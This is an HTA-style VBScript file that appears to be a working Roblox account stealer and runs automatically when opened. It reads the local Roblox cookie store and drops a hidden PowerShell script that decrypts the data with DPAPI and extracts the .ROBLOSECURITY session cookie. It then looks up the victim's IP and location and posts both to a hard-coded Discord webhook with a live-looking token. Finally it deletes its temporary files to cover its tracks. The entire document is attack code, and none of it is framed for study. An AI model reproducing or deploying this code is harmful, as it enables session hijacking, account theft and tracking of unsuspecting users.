<script language="VBScript">
Option Explicit

Dim fso, shell, webhook, tempDir
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
webhook = "https://discord.com/api/webhooks/"
webhook = webhook & "1536210034533597225/"
webhook = webhook & "BdCQraMq8r90M0R-sOGlFnACFESF_j1fdtKY5MJE3st5IYfBNndVYnP48EmVPyHsy9KG"
tempDir = shell.ExpandEnvironmentStrings("%TEMP%")

Function GetLocation()
  On Error Resume Next
  Dim xmlhttp
  Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  xmlhttp.Open "GET", "https://ipinfo.io/json", False
  xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0"
  xmlhttp.Send
  If xmlhttp.Status = 200 Then
    GetLocation = xmlhttp.responseText
  Else
    GetLocation = "{""ip"":""unknown""}"
  End If
End Function

Function GetRobloxCookie()
  On Error Resume Next
  Dim path, raw, b64, b64File, psFile, cmd, exec, ts, startPos, endPos, output, errorText

  path = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
  If Not fso.FileExists(path) Then
    GetRobloxCookie = "file not found"
    Exit Function
  End If

  Set ts = fso.OpenTextFile(path, 1)
  raw = ts.ReadAll
  ts.Close

  startPos = InStr(1, raw, """CookiesData""")
  If startPos = 0 Then
    GetRobloxCookie = "no CookiesData key"
    Exit Function
  End If

  startPos = InStr(startPos, raw, ":")
  If startPos = 0 Then
    GetRobloxCookie = "no colon"
    Exit Function
  End If

  startPos = startPos + 1
  Do While startPos <= Len(raw) And (Mid(raw, startPos, 1) = " " Or Mid(raw, startPos, 1) = """")
    startPos = startPos + 1
  Loop

  endPos = startPos
  Do While endPos <= Len(raw)
    If Mid(raw, endPos, 1) = """" Then Exit Do
    endPos = endPos + 1
  Loop

  b64 = Mid(raw, startPos, endPos - startPos)
  If Len(b64) < 20 Then
    GetRobloxCookie = "b64 too short"
    Exit Function
  End If

  b64File = tempDir & "\rc_b64.txt"
  Set ts = fso.CreateTextFile(b64File, True)
  ts.Write b64
  ts.Close

  psFile = tempDir & "\rc_dec.ps1"

  Set ts = fso.CreateTextFile(psFile, True)
  ts.WriteLine "Add-Type -AssemblyName System.Security"
  ts.WriteLine "$ErrorActionPreference='Stop'"
  ts.WriteLine "$b64 = Get-Content -Raw '" & b64File & "'"
  ts.WriteLine "$bytes = [Convert]::FromBase64String($b64.Trim())"
  ts.WriteLine "$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
  ts.WriteLine "$data = [System.Text.Encoding]::UTF8.GetString($decrypted)"
  ts.WriteLine "$i = $data.IndexOf('.ROBLOSECURITY')"
  ts.WriteLine "if ($i -ne -1) {"
  ts.WriteLine "  $i += 15"
  ts.WriteLine "  while ($i -lt $data.Length -and ($data[$i] -eq [char]9 -or $data[$i] -eq [char]32)) { $i++ }"
  ts.WriteLine "  $s = $i"
  ts.WriteLine "  while ($i -lt $data.Length -and $data[$i] -ne [char]59 -and $data[$i] -ne [char]10 -and $data[$i] -ne [char]13) { $i++ }"
  ts.WriteLine "  $cookie = $data.Substring($s, $i - $s).Trim()"
  ts.WriteLine "  if (-not $cookie.StartsWith('_|')) {"
  ts.WriteLine "    $l = $data.IndexOf([char]10, $s)"
  ts.WriteLine "    if ($l -eq -1) { $l = $data.Length }"
  ts.WriteLine "    $line = $data.Substring($s, $l - $s)"
  ts.WriteLine "    $parts = $line.Split([char]9)"
  ts.WriteLine "    for ($p = $parts.Length - 1; $p -ge 0; $p--) {"
  ts.WriteLine "      if ($parts[$p].Trim().StartsWith('_|')) {"
  ts.WriteLine "        $cookie = $parts[$p].Trim()"
  ts.WriteLine "        break"
  ts.WriteLine "      }"
  ts.WriteLine "    }"
  ts.WriteLine "  }"
  ts.WriteLine "  if ($cookie.StartsWith('_|')) { $cookie }"
  ts.WriteLine "}"
  ts.Close

  cmd = "powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"
  Set exec = shell.Exec(cmd)
  output = exec.StdOut.ReadAll
  errorText = exec.StdErr.ReadAll

  On Error Resume Next
  fso.DeleteFile b64File, True
  fso.DeleteFile psFile, True

  If Len(output) > 20 And Left(output, 2) = "_|" Then
    GetRobloxCookie = Trim(output)
  Else
    GetRobloxCookie = "no cookie extracted"
  End If
End Function

Sub SendToWebhook(loc, cookie)
  On Error Resume Next
  Dim payload, xmlhttp
  Dim escapedLoc, escapedCookie

  escapedLoc = Replace(loc, "\", "\\")
  escapedLoc = Replace(escapedLoc, """", "\""")
  escapedLoc = Replace(escapedLoc, vbCrLf, "\n")
  escapedLoc = Replace(escapedLoc, vbCr, "\n")
  escapedLoc = Replace(escapedLoc, vbLf, "\n")

  escapedCookie = Replace(cookie, "\", "\\")
  escapedCookie = Replace(escapedCookie, """", "\""")
  escapedCookie = Replace(escapedCookie, vbCrLf, "\n")
  escapedCookie = Replace(escapedCookie, vbCr, "\n")
  escapedCookie = Replace(escapedCookie, vbLf, "\n")

  payload = "{""content"":""**Hit!**\n**Location:**\n```" & escapedLoc & "```\n**.ROBLOSECURITY:**\n```" & escapedCookie & "```""}"

  Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  xmlhttp.Open "POST", webhook, False
  xmlhttp.setRequestHeader "Content-Type", "application/json"
  xmlhttp.Send payload
End Sub

Sub Main()
  On Error Resume Next
  Dim loc, cookie
  loc = GetLocation()
  cookie = GetRobloxCookie()
  SendToWebhook loc, cookie
  window.close
End Sub

Main
</script>
